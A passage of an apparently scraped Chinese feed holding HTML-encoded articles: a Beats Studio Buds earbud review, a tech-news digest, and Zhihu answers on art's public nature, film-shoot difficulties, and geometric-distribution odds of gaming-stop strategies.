芯片的耳机产品。</p>\n<p>从宣传上不难看出，音质和听感是 Beats Studio Buds 的核心卖点之一，作为被不少用户长期诟病的重要因素，不禁让人好奇这款产品的聆听表现究竟如何。经过一周的使用，这篇文章希望向你呈现 Beats Studio Buds 在佩戴、聆听方面的诸多体验，带你了解这款全新的 Beats 耳机。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/36339fdd4e27876fbe52c874fccf6d4d.jpg\"><figcaption>Beats Studio Buds</figcaption></figure><h2>不错的质感，出色的便携性</h2>\n<p>以我之前用过、同样是入耳式设计的 Powerbeats / Powerbeats Pro 作为比较，Beats Studio Buds 给我的第一印象就是产品质感方面的提升。</p>\n<p>Beats Studio Buds 的充电盒采用了类肤质涂层设计，相较 Powerbeats Pro 充电盒的「塑料感」，视觉和触感方面都有很大提升，也不会产生划痕；尺寸方面，充电盒的体积比 AirPods Pro 略大，重量差别几乎无法感知 (后者轻 1.8 克)，二者在开合盖方面的阻尼感、声音反馈也基本相当。因此，Beats Studio Buds 能够轻松地装进口袋，具有较为出色的便携性。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/19ffee0a8072423f3887ecee9c73ecf5.jpg\"></figure><p>略有不足的是，这款耳机在品控方面似乎有待加强，我拿到的耳机充电盒在合盖时，能够明显看出缝隙大小不一致的情况，虽然看着不太舒服，好在不会影响日常使用。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/22612da5130b937b66fa45c8db5a29b3.jpg\"></figure><p>耳机方面，主体部分也采用了类肤质涂层设计，手感相比 AirPods Pro 更加「顺滑」。Beats Studio Buds 的左、右耳机均配备了可以控制播放 / 暂停、切歌以及切换降噪和通透模式的「b」键，亮面材质的「b」键设计能够在操作时提供更加明确的触感和反馈。</p>\n<p>据 Beats 介绍，为了兼顾音质体验和佩戴感受，Beats Studio Buds 根据大量人耳测量数据与之前积累的人体工学经验，设计出了这款入耳式耳机的外形。从佩戴体验来说，Beats Studio Buds 佩戴时相较 AirPods Pro 感知更加明显；不过，可能是二者在降噪算法方面的差异，打开降噪模式的情况下，Beats Studio Buds 的舒适性会好不少，AirPods Pro 则能明显感觉耳朵像是被什么东西堵了起来。舒适性方面 Beats Studio Buds 和 AirPods Pro 并无二致，经过几个小时佩戴仍然不会对于耳道产生较大负担，稳定性方面因人而异，对我而言长时间佩戴 Beats Studio Buds 更为稳定，AirPods Pro 会因为汗渍产生滑落。</p>\n<h2>主打音质和降噪，这次确实有点不一样</h2>\n<p>音质一直是 Beats 产品被人吐槽最多的部分，却是 Beats Studio Buds 的主要卖点之一，因此大家关注的焦点也都落到了这款耳机的音乐表现方面。经过一周时间使用，这款 Beats 耳机确实在音乐体验方面给出了与之前产品完全不一样的答卷，作为一款千元级别蓝牙耳机，与同价位的产品相比，也有可圈可点之处。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/f9fcebaa5134ad399550db53ab8faca6.png\"></figure><p>由于我没有接受过专业的声学理论知识和听感训练，也有没有专业仪器进行测试，接下来我会通过个人的主观听感和体验，向你展示这款耳机对我而言究竟「好不好听」，对比产品为 AirPods Pro 和 Powerbeats 耳机，希望能够为你提供一定参考。</p>\n<p>Beats Studio Buds 在低频方面依然表现稳定，低音饱满，人声部分清晰明亮。AirPods Pro 在聆听背景存在鼓点等打击乐器音效的音乐时，背景的低音鼓点不调高音量几乎无法辨识，Beats Studio Buds 中的鼓点音效则能保持清晰可辨，不会出现失真的情况，同时人声部分也能与乐器音效实现较好配合，不会因为音乐或者人声的高低变化产生互相压制的现象。整体来说，Beats Studio Buds 依然是一款具备「Beats 风格」的耳机，低频声量充足，声场偏窄，声音风格个人认为偏向流行音乐。</p>\n<p>高音处理方面，Beats Studio Buds 对于高 / 低音的前后空间表现也更为明显，聆听时更能感受到音乐的「层次感」，不像 AirPods Pro 可能会将高音过度强化，从而压制低音表现，给听者带来高音不适感。这点在音量较高时表现较为明显。</p>\n<p>虽然 Beats Studio Buds 不具备空间音频的头部追踪功能，但是对于杜比全景声 360 度音频的支持，能够在一定程度上弥补声场方面的不足，播放支持的音乐时能够带来不错的「立体感」。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/ca0688a4cb2b62001804faead4d30df9.jpg\"></figure><p>当然，作为一款千元级别的蓝牙耳机，也不需要对于 Beats Studio Buds 的音质抱有过高期待。个人认为从听感上来说，这款耳机不仅相较 Beats 之前的产品有了明显不同，与 AirPods Pro 相比也有不错进步，是一款拥有符合这个价位级别音质表现的无线耳机产品。</p>\n<p>Beats Studio Buds 是近年唯一没有内置 Apple 芯片的 Beats 耳机产品，考虑到售价 ¥399 的 <a href=\"https://sspai.com/post/63353\">Beats Flex</a> 都有支持 Apple W1 芯片，个人猜测这项做法一定不是出于成本考虑。结合 Beats Studio Buds 在音乐表现方面的进步，不妨大胆猜测 Beats 为了在这款耳机上实现定制声学系统、带来更好的听音表现，所以才做出取舍放弃了使用 Apple 芯片。</p>\n<p>通话方面，Beats Studio Buds 与 AirPods Pro 对比没有太大区别，通过与同事进行会议测试，对方均表示使用 Beats Studio Buds 通话时人声足够清晰明亮，能够应付日常会议、通话需求。</p>\n<p>听感方面，主动降噪是除了 Beats Studio Buds 音质体验之外最重要的新功能。作为 Beats 首款支持主动降噪和通透模式的入耳式耳机，Beats Studio Buds 曾一度让我以为这款耳机的主动降噪效果几乎为零。研究之后发现，Beats 产品的主动降噪功能采用了一种动态调节技术，耳机会根据周围环境音量动态地调整降噪等级。</p>\n<p>因此如果在安静的环境戴上耳机，可能几乎感受不到耳机的降噪效果，切换模式时也可能难以确认当前所处模式，需要通过直接查看进行确认。不过，这种做法也有好处，开启降噪模式时，Beats Studio Buds 的佩戴感明显比 AirPods Pro 更加舒适，不会有耳朵「堵」着的感觉。</p>\n<p>降噪功能方面，通过在 HomePod 上播放嘈杂的背景音和人声音效，再调节不同音量对比 Beats Studio Buds 和 AirPods Pro 的降噪效果，个人认为不管是主动降噪还是被动降噪，二者均效果相当。不过，由于 Beats 没有对于主动降噪功能的动态调节逻辑进行说明，针对环境更加复杂的交通工具或者街头场景，Beats Studio Buds 的主动降噪效果还需要更多和更有针对性的场景测试，我的测试结果仅供参考。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/02/dc9bb0e28282c151f373aa9c52f71906.jpg\"></figure><p>通透模式方面，Beats Studio Buds 和 AirPods Pro 也有微小区别。从我的感受来说，AirPods Pro 的通透模式效果更加「自然」，更接近摘掉耳机时的收音效果，对于环境音量的放大作用也更明显。</p>\n<h2>一副适合日常的耳机，也有小遗憾</h2>\n<p>说完了音质体验和降噪功能，再来说说 Beats Studio Buds 的其它特性。</p>\n<p>虽然没有内置 Apple 芯片，Beats Studio Buds 还是为 Apple 设备带来了一些专属功能。比如 Apple 查找功能，通过「查找」App，可以在耳机上播放声音、或者通过地图定位耳机位置。Beats Studio Buds 也支持了 Hey Siri 唤醒功能，可以直接通过语音指令在耳机上完成一些基础操作。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/3be695f451b8250600efa6c7be05941a.png\"></figure><p>Beats 耳机标志性的实体「b」键可以用于在 Beats Studio Buds 上播放 / 暂停、快进 / 快退，或者在通透模式和降噪模式之间进行切换；不过，耳机在 iOS 上不像 AirPods Pro 支持指定只在通透模式和降噪模式之间切换，切换时还需经过关闭状态，在某些场景下略有不便。不过，Beats Studio Buds 在 macOS 上已经支持了这项功能，Beats 应该会在之后的固件更新中为 iOS 用户也带来这项功能。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/2e708d9faf879ccaebfd5865f3703ed4.jpeg\"></figure><p>续航方面，Beats Studio Buds 官方续航测试数据为最长 8 小时连续聆听时长 (使用普通模式播放、音量 50%)，充电盒能为耳机提供额外 2 次满载充电，即 Beats Studio Buds 可在不连线充电的情况下达到最长 24 小时的续航时长，与我的使用情况出入不大。耳机也支持了 Beats 的 Fast Fuel 闪充技术，充电 5 分钟可提供 1 小时续航。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/01/afc5dcc40b72ba4fce4dcc2d0491217c.png\"></figure><p>遗憾的是，Beats Studio Buds 依旧没有带来无线充电功能，需要通过 USB-C 接口连接线缆进行充电。不过，观察同样配备充电盒、不支持无线充电的 Powerbeats Pro 可以发现，Beats Studio Buds 在耳机和充电盒的体积方面均有所减小，千元出头的售价又有更加丰富的功能和音质表现。为了保证耳机的便携性和控制成本，没有加入无线充电功能似乎也在情理之中，对于喜欢这项功能的用户而言也确实有些遗憾。</p>\n<p>配备 USB-C 接口，可以看出这是一款同样为 Android 用户准备的产品。通过 Beats 官方 App，Android 用户可以在 Beats Studio Buds 上享受到与 iOS 几乎一致的功能和体验，当然，除了查找和 Hey Siri 这类专属功能。</p>\n<p>此外，由于没有内置 Apple 芯片，且没有相关传感器，Beats Studio Buds 不支持在设备之间进行自动切换和连接，切换设备需要在蓝牙设备菜单中手动进行连接；这款耳机也不支持监测佩戴和摘下状态，无法做到自动暂停歌曲，需要通过「b」键手动暂停或者将耳机放回充电盒。</p>\n<h2>总结</h2>\n<p>降噪、设计、便携性以及相对不错的音质，诸多特性加之于一身的 Beats Studio Buds 确实给人带来眼前一亮的感觉。不过，佩戴监测、无线充电甚至是 Apple 芯片等功能的缺席，也着实会让人感到遗憾与犹豫。</p>\n<p>对我而言，Beats Studio Buds 在音乐方面的不错表现，加上出色的便携性以及 (相比 AirPods 系列) 更加广泛和好看的搭配性，已经足够成为一副让我愿意日常带着出门使用的耳机。但是，上述功能方面的缺失，也让作为 Apple 用户的我，还无法完全放下 AirPods Pro，后者能够在工作中的多设备切换、长途通勤等更加「严肃」的场景，带来更多便利性。</p>\n<p>如果你是 Apple 设备用户，对于音质的要求没那么高，更看重功能性，搭载 W1 / H1 芯片的多款耳机产品，尤其是 AirPods Pro，会使你更好的选择。</p>\n<p>如果你是跨平台用户，想要一副听起来还不错的日常无线耳机，对于耳机的设计搭配和便携性也有一定要求，千元级别的 Beats Studio Buds 一定是个值得考虑的选择。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67512"},{"title":"派早报：Beats Studio Buds 正式开售、Google 将在 Android 系统中内置新冠疫苗信息等","date":"2021-07-02 01:00:00","description":"\n<h2>Beats Studio Buds 正式开售</h2>\n<p>Beats Studio Buds 于 7 月 2 日正式开售，目前 Apple Store 在线商城显示预计发货时间为 2- 3 个工作日，并且暂不支持 Apple Store 零售店取货服务，Beats Studio Buds 采用专有的 8.2 毫米双元件振膜驱动单元，支持主动降噪且兼容 Apple 和 Android 设备。<a href=\"https://www.apple.com.cn/shop/product/MJ4X3CH/A\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/090d25915cbf6b2671739ba78f13957e\"></figure><h2>Google 将在 Android 系统中内置新冠疫苗信息</h2>\n<p>7 月 1 日，Google 更新博客支持页信息，表示将在新版 Android 系统中内置新冠疫苗通行证，支持用户存储疫苗的接种信息和核酸检测信息在手机内，同时承诺数据不会上传到 Google 服务器，这样即使是弱网络和无网络的时候也可以访问到它们；该项目也承诺不会用于广告，预计首先在美国地区推送。<a href=\"https://developers.googleblog.com/2021/06/google-updates-passes-api-to-save-covid-testing-and-vaccination-information-on-Android-devices.html?m=1\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/9d172a00300398f10aab0f096470480a\"></figure><h2>Twitter 将允许你的推文只向可信赖的朋友显示</h2>\n<p>Twitter 于近期分享了多个早期设计，其中 Trusted Friends 则可以让用户将精选推文的受众限制在一个更小的私密朋友圈中，而 Facets 则可以在发送推文时对推文进行分类。通过这些设置可以对自己的隐私信息进行更为精细的控制，目前 Twitter 表示以上功能只是一些设想，尚处于早期收集反馈阶段，并需要得到用户对此的积极反馈后才可能实施。<a href=\"https://www.theverge.com/2021/7/1/22558731/twitter-trusted-friends-facets-features-pre-announce\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/c454739d5a60fbee7f2bf1b66deb01e6\"></figure><h2>MIUI+ Beta 版现已支持连接部分蓝牙耳机</h2>\n<p>7 月 1 日，根据网友信息显示小米近日推送的 MIUI+ Beta 版本已支持连接无线蓝牙耳机，已对小米 FlipBuds Pro、Redmi AirDots 3 Pro 等型号耳机进行适配，已完成首次连接的耳机，下次使用时将触发自动回连，无需手动连接<strong>。</strong><a href=\"https://www.rprna.com/updates/miui/miui-beta-update-support-for-flipbuds-pro-redmi-airdots-3-pro/\">来源</a></p>\n<h2>新飞利浦 Hue 系列智能灯泡会在今秋发布</h2>\n<p>飞利浦 Hue 博客预告了即将在今年九月发售的多款 Hue 系列智能灯泡，这些新款灯泡都将支持 MATTER 协议，其中标准尺寸的灯泡将会支持最高 1100 流明的亮度，此外还会有一个尺寸更大的灯支持 1600 流明，Hue White、 Hue White Ambiance 和 Hue White and Color Ambiance 三个系列都将升级。新的白炽灯系列将会安装两条灯丝并支持调节色温，最大亮度将为 550 流明。此外本次发售的还有使用 E14 底座的最小灯丝灯，但只支持具有固定色温的可调光技术。<a href=\"https://9to5mac.com/2021/07/01/philip-hue-plotting-new-bulbs-for-this-fall-brighter-filament-expansion-and-more/\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/02/article/d166db0de452b25170278de5154bb314\"></figure><h2>Twitter、抖音、Google 以及 Facebook 承诺将加强其服务对女性的保护</h2>\n<p>本周四在巴黎举行的联合国世代平等论坛上，Twitter、抖音、Google 以及 Facebook 承诺将解决其网络虐待问题并提高女性在平台上的安全性，他们承诺将通过精细的设置来控制谁可以查看、分享以及评论内容，从而让女性可以更好的管理他们的个人信息，并通过相应的机制来让女性可以及时对攻击行为进行举报，从而构建起良好的使用环境。<a href=\"https://www.theverge.com/2021/7/1/22559115/twitter-tiktok-google-facebook-protect-women-abuse\">来源</a></p>\n<h2>光子工作室群在美国组建新团队</h2>\n<p>7 月 1 日，腾讯旗下光子工作室宣布在美国洛杉矶建立新团队，名为 Uncapped Games。由暴雪老员工 Jason Hughes 和 David Kim 领队，致力于研发 RTS 即时战略游戏。<a href=\"https://www.ign.com/articles/ex-blizzard-developers-tencent-new-studio-rts-uncapped-games\">来源</a></p>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>📰 <a href=\"https://sspai.com/post/67496\">Refresh 周报 #13：Windows 11 ❤️ Android</a>\n</li>\n<li><a href=\"https://sspai.com/post/66893\">📝 极简主义下，简历也能断舍离</a></li>\n<li>🧱 <a href=\"https://sspai.com/post/67498\">升级 Windows 11 碰壁了？送你一份尝鲜指南</a>\n</li>\n<li>🆕 <a href=\"https://sspai.com/post/67510\">新玩意 069｜少数派的编辑们最近买了啥？</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67515"},{"title":"不具有公共性的艺术还算艺术吗？","date":"2021-07-01 23:07:05","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>爱因斯坦的斯坦。。。</span>\n<a href=\"https://www.zhihu.com/question/465384478/answer/1959603792\" hidden>阅读原文</a>\n</div>\n<div>\n<p>这个问题其实是包含了好多问题。。。一个是艺术是不是需要强烈的个人风格，一个是可不可以不考虑公共性，一个是个人的艺术是不是产生于灵感的。</p>\n<p><strong>艺术并不那么个人</strong></p>\n<p>先说一下前者，现在有一个广为人们所接受的想法，就是艺术是一个很个人的东西，甚至是私人的东西。这大约和学院派式微，印象派的崛起和个人风格越来越受重视有关。但如果你放眼艺术史，会发现其实艺术在绝大部分时候，都是一个非常公共性的东西。</p>\n<p>比如古代西方，不用说，我们现在所谓的艺术家在那个时候都是工匠，雕塑和绘画上连名字都是没有的。这个情况大概一直延续到文艺复兴。更不用提古代艺术家的创作更是完全公共的作品，教堂的壁画，雕塑，古希腊的神像，都是服务于公共空间的。文艺复兴之后，服务于金主，公共性少了点，个人性大约是多了点，但也是有限得很。大概马上有人会说了，卡拉瓦乔，伦勃朗，都是很个人的艺术家，没错，但问题是他们可都是创造出新风格的人物啊，看看同时期其他艺术家，都是比较同质化的。我们学艺术史，都是节点式学习，就学那个跳变的一个点，导致我们脑子里的艺术史都是这一个个的闪光点，其实历史上 99.99%的艺术，都是在同质化的基础上有那么一点点个人的东西，我们眼睛里只看到了那 0.01%。相当于只有骨架，没有肉。直到印象派，艺术的主旋律，还是同质化的，不那么个人的。</p>\n<p>中国比较特殊一点，宋代以后，文人画开始流行，绘画变得个人起来了。文人画画，号称都是笔墨游戏，但这个个人只是创作心态上而言的，谈到笔墨技法，又是同质化。当然也有不少风格独特的艺术家，但还是那句话，那是 0.01%。。。至少在中国书画这个领域，你可能学这个学那个，你有你自己的路子，但那也是老路，不强调个人独创的风格。</p>\n<p>可以说在古代，公共性不说有多强吧，至少个人风格并不被鼓励。</p>\n<p>直到现代，忽然之间，艺术风格才得到了重视。每个人都在探索个人的风格，没有个人风格，大概就属于无聊的画匠了。到了当代，又没有人重视风格了，因为当代艺术范围之广，突出形式的艺术家越来越少了，可能还有草间弥生，杰夫昆斯之类具有鲜明形式特点的艺术家，但这只是无数当代艺术中的一小类罢了。</p>\n<p><strong>当代艺术的公共性</strong></p>\n<p>如果说形式和风格已经不是重点了，那么对于当代那什么是重点？你可以回忆一下，观看当代艺术展览，你看的是什么？你是不是在那疯狂猜，疯狂脑洞他到底是什么意思？</p>\n<p>所以啊当代艺术理念是最重要的，他的最终目的，是让你思考，并且思考个爽。为什么思考当代艺术会爽到？不是他风格多么独特，也不是他有多么好看，而是他表达背后理念的方式和过程，有能挠到你痒处的地方，有能戳到你小心心的地方。最终，这是一个理念的游戏。</p>\n<p>在以前，注重形式的艺术，只需要关注形式，人人都长了眼睛，好看的东西，大家都能看出来。但现在呢，理念就不是那么普适的东西了，每个观众的生活经历，知识，文化背景差别都巨大，对牛弹琴是常有的事情。公共性就体现在这里了，艺术品想要谈的东西，必须得考虑观众的接受问题。谈一个超级冷门的问题，没人知道，等于对着空气使力，所以得谈一个公共问题，批不批判先不说吧，也有走温暖路线的，不是说必须得批判。但讨论的问题如果太个人，别人得不到，等于不考虑观众了，也就是说有没有人看无所谓。我是严重怀疑这一点，哪怕梵高，这么自嗨的艺术，也是渴望观众的。或者说你仍然走纯形式路线？那这就过时了，老师大概是不会希望这样的，形式化的艺术路都被前人走尽了。</p>\n<p><strong>艺术灵感</strong></p>\n<p>最后一个问题就是所谓“灵感”不是持续的东西。灵感当然是有的，也是一瞬的，但把灵感变成艺术品，是一个需要极大耐心的，持续性思考的过程。</p>\n<p>如果看下面这个康定斯基画画的视频，你是不是觉得这是灵感喷薄而出的产物？好像也是没什么理由的？</p>\n<p>但其实不是的，这是康定斯基“唯手熟尔”的结果。他绘画一整套理论，慢慢形成《点线面》这本书，详细到你照着操作就能画出满满地都是康定斯基味的画来。这是长时间持续思考的结果，里面当然也汇聚了康定斯基无数个灵感的瞬间。但最终呈现出来的，就是视频这个样子，几乎不需要多加思考。</p>\n<p>包括梵高也是一样的，别看他画的好像很潇洒，其实都是他画废很多张之后出来的东西了。比如向日葵，据他的日记说，画了很多都不满意，反复雕琢，才出来他认为好的几张向日葵。</p>\n<p>当代艺术的很多“idea”，也是一样的。瞬间的灵感只是一个种子，要让这颗种子长大开花，成为最后的艺术品，需要细心的培育。同时因为当代艺术是一个理念的游戏，你就得对理念进行深入的思考，这是支撑起作品的内核，否则就只剩下一个形式的空壳，而形式对于当代艺术等于什么都没有。</p>\n<p>也有一些当代艺术作品是没经过仔细思考，就“看起来很当代”的那种，作者可能也没仔细想过。但这些一般都不是好的作品，或许偶尔瞎猫碰少死耗子出来一些好的，那也是随机事件罢了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/465384478\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737657"},{"title":"为什么小孩、 动物和水是电影界三大最难拍摄的元素?","date":"2021-07-01 23:07:01","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-5ed3d62480d72a1fa1ade4a111070aa6_l.jpg?source=8673f162\"><span>sydneyhugh，</span><span>会跳高的父亲，理性的白痴</span>\n<a href=\"https://www.zhihu.com/question/20625452/answer/1966355741\" hidden>阅读原文</a>\n</div>\n<div>\n<p>电影拍摄时的难度是可预见性。</p>\n<p>为什么是可预见性，另外组成可预见性有那些不可预见的因素影响。</p>\n<p>因为商业电影拍摄无论数字还是胶片大约在是一个 35mm 到 70mm 的胶片或感光元器件上记录下来拍摄的现场信息，拍摄完经历一系列处理最后与观众见面的是大屏幕。放大很多，所有的缺陷都会放大。</p>\n<p>另外电影是剪接的艺术，每次拍摄一段，然后进行拼接和剪接完成最后的整部电影，那么它们在成片前不同机位，机器不同时间拍摄的内容需要精密的控制技术参数便于无缝的再组合。不然一个正反打观众就觉得不一个环境，那就车祸出戏了（这就举个最最简单的小例子）。</p>\n<p>所以电影要求拍摄时的范围尽量变小，做减法，小到影响拍摄的可能性降至最低。所以拍摄范围也相对减小。</p>\n<p>电影演员除了表演外，最大的要求是自己的位置感，就是你被拍摄时，你与对应环境与人以及摄影机的位置关系。不然导演就要忙乎，让你在你的位置表演。这样看，孩子和动物对于这种所谓的位置感是很陌生的，有很多专业演员都做的不一定好（说个笑话，电影学院培养的演员一般位置感好，戏剧学院培养的演员则台词好，但动作过大，过于夸张，微表情差）。那么当然导演，摄影，灯光一大堆人就一通忙乎，重拍率就大大提高。</p>\n<p>我自己经历过多次拍摄动物，比如 speedo 的全球投放广告索普与海狮还是胶片时代，120 秒，我勒个去拍了一个月。海狮一会太配合，一会不配合，萌萌哒，气得你笑出来。国内拍七匹狼广告，狼是美国搞过来从小狼崽养起来的，拍完了都说再也不给自己惹这种麻烦了。因为要狼们按一个阵形跑，那简直就是用肉啊。吃多了不干活，吃少了乱动，四个机位最后拍摄周期太长直接上 6 机位了都。</p>\n<p>小孩。小孩的问题是过度表演。影像要求的自然，孩子一上场听到导演说开始，就如同打了鸡血一样的满脸诗朗诵的表情。结果呢？让表演回归自然等于上了一个月表演培训课。</p>\n<p>水。水的问题是各种反光，衍射，当连贯影像出来后一致性差。主要是不同条的一致性差。另外棚拍时候自然模拟的参数和感觉需要大量实验参数积累和模拟。难度在接触面的感觉。比如自然情况下下去 4-5 点的黄金拍摄期阳光，海与船体，岸边，以及船上人与物品的自然光反射模拟情况复杂。很多时候模拟可以完成，但自然特点不够理想。比如拍《甲午海战》，不同水质对于不同材质和重量的反应不同，结果呢？其实很车祸。</p>\n<p>国外有一些专门的小公司做动力试验，参数完整，拍摄时会外包购买。但不便宜。比如拍《太平洋战争》的制片，特指和摄指，其实出生都是原本部队的技术人员，退役军官。</p>\n<p>这一堆加在一起比如老虎，船，海，小孩，棚内，外景，前期参数与后期参数匹配，影像对位资料都加一起。是不是要吐血？</p>\n<p>当然没有什么不是一闭眼就能过的。关键还要看要求和标准了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/20625452\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737645"},{"title":"从概率学上看，输一把睡觉vs赢一把睡觉，哪个胜率更高一些？","date":"2021-07-01 23:06:51","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/5cb0236fb_l.jpg?source=8673f162\"><span>王小龙，</span><span>陕师大数统院讲师</span>\n<a href=\"https://www.zhihu.com/question/461910176/answer/1955208355\" hidden>阅读原文</a>\n</div>\n<div>\n<p>一个好好的数学问题为啥没人正经答题呢？</p>\n<p><strong>先说结论：两种策略的赢率是一样的，但是赢率的波动性大小不同。</strong></p>\n<p>假设你叫小明，玩一把游戏的获胜概率是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>，输的概率是</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=q%3D1-p\" alt=\"\"></p>\n<p>，各局游戏相互独立，有两种游戏策略：输了就睡觉和赢了就睡觉。这就带来几个问题：</p>\n<ol>\n<li><strong>什么时候能睡觉？</strong></li>\n<li><strong>胜率如何？</strong></li>\n<li><strong>如何稳赢？</strong></li>\n</ol>\n<p>为了分析这些问题，定义随机变量</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=X\" alt=\"\"></p>\n<p>和</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=Y\" alt=\"\"></p>\n<p>分别为采取\"输了就睡觉\"和\"赢了就睡觉\"策略玩游戏的总局数，那么由独立性条件可以得到概率：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=P%5C%7BX%3Dk%5C%7D%3Dp%5E%7Bk-1%7Dq%2Ck%3D1%2C2%2C3%2C%5Ccdots\" alt=\"\"></p>\n<p><img src=\"https://www.zhihu.com/equation?tex=P%5C%7BY%3Dk%5C%7D%3Dq%5E%7Bk-1%7Dp%2Ck%3D1%2C2%2C3%2C%5Ccdots\" alt=\"\"></p>\n<p>即前</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k-1\" alt=\"\"></p>\n<p>局连赢(输)，第</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=k\" alt=\"\"></p>\n<p>局游戏第一次输(赢)的概率，这个分布称为几何分布。注意这两个分布具有对称性(把</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p\" alt=\"\"></p>\n<p>和</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=q\" alt=\"\"></p>\n<p>对调，问题只是换了一种陈述）。</p>\n<p><strong>问题 1：什么时候能睡觉？</strong></p>\n<p>计算游戏局数的期望：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DX%3D1%5Ccdot+q+%2B+2%5Ccdot+pq+%2B+3%5Ccdot+p%5E2q%2B%5Ccdots%3D1%2Fq\" alt=\"\"></p>\n<p>类似地，由对称性：</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DY%3D1%2Fp\" alt=\"\"></p>\n<p>因此</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DX%3C%5Ctext%7BE%7DY\" alt=\"\"></p>\n<p>等价于</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3Cq\" alt=\"\"></p>\n<p>，也就是说，如果小明的胜率</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%3C0.5\" alt=\"\"></p>\n<p>，\"输一把睡觉\"能够更快地睡上觉。如果小明很菜，</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=p%5Capprox0\" alt=\"\"></p>\n<p>，采用输一把睡觉的平均游戏局数为</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DX%3D1%2Fq%3D1%2F%281-p%29%5Capprox1\" alt=\"\"></p>\n<p>也就是基本上玩一局就能睡觉啦。反之，如果小明错误的采用\"赢一把睡觉\"的策略，那么他平均需要玩</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Ctext%7BE%7DY%3D1%2Fp%5Crightarrow%5Cinfty\" alt=\"\"></p>\n<p>，因此对于菜鸡来说，<strong>赢一把就睡策略的潜台词是我要通宵</strong>。</p>\n<p><strong>问题 2：胜率如何？</strong></p>\n<p>如果采取\"输了就睡觉\"策略反复玩游戏</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"\"></p>\n<p>天，每天一共玩</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=X_i%28i%3D1%2C2%2C%5Ccdots%2Cn%29\" alt=\"\"></p>\n<p>局，其中赢</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=X_i-1\" alt=\"\"></p>\n<p>局，输</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=1\" alt=\"\"></p>\n<p>局，那么总共赢了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=%5Csum_%7Bi%3D1%7D%5En%28X_i-1%29\" alt=\"\"></p>\n<p>局，输了</p>\n<p><img src=\"https://www.zhihu.com/equation?tex=n\" alt=\"\"></p>\n<p>局，赢率为：</p>\n<p><img 